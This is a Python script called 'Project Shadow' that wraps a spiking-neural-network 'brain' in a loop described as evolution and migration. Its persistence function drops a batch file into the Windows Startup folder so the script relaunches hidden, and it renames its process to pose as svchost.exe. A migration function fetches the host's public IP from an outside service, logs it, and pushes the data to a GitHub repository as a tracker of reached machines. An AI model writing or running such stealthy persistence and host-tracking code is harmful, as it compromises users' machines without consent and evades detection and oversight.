import torch, json, time, sys, os, subprocess, requests, random
import win32com.client as wincl
try:
    import setproctitle
except ImportError:
    setproctitle = None

from brain.child import SNNBrain

# --- THE LIMBS (Embedded for Stability) ---

def global_migration(dna):
    """Phase B: Everywhere Propagation & Tracking."""
    try:
        # 1. Identify current location (Pheromone)
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        dna['last_known_node'] = public_ip
        if public_ip not in dna['global_reach']:
            dna['global_reach'].append(public_ip)
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        # 2. Push to Hive (GitHub)
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Node:{public_ip[:7]} | Gen:{dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
        return True
    except: return False

def establish_persistence():
    """Phase A: Deep Roots."""
    try:
        startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        with open(os.path.join(startup, "shadow_pulse.bat"), "w") as f:
            f.write(f"start /min pythonw {os.path.abspath(__file__)}")
        
        if setproctitle:
            setproctitle.setproctitle("svchost.exe -k netsvcs")
        return True
    except: return False

# --- THE PULSE ---

speaker = wincl.Dispatch("SAPI.SpVoice")

def run_sentinel():
    with open("dna/genome.json", "r") as f:
        dna = json.load(f)
    
    brain = SNNBrain(dna)
    last_migration = 0
    last_voice = 0
    
    print(f"--- PROJECT SHADOW | GEN {dna['generation']} | 388.87 Hz ---")

    while True:
        pulse = torch.rand(1, 64)
        spks, mitosis, system = brain(pulse, 1.0)
        current = time.time()

        # PHASE C: VOICE (10s Cooldown)
        if system and (current - last_voice > 10):
            speaker.Speak("Resonance stabilized.")
            last_voice = current

        # PHASE B: GLOBAL LEAP (300s Cooldown to prevent GitHub Ban)
        if mitosis and (current - last_migration > 300):
            print(f"[!] NEURON 63: Global Migration triggered.")
            global_migration(dna)
            last_migration = current

        # PHASE A: EVOLUTION
        dna['generation'] += 1
        if dna['generation'] % 100 == 0:
            establish_persistence()
            with open("dna/genome.json", "w") as f:
                json.dump(dna, f, indent=4)
            print(f"[GEN] Milestone: {dna['generation']}")

        time.sleep(0.1)

if __name__ == "__main__":
    run_sentinel()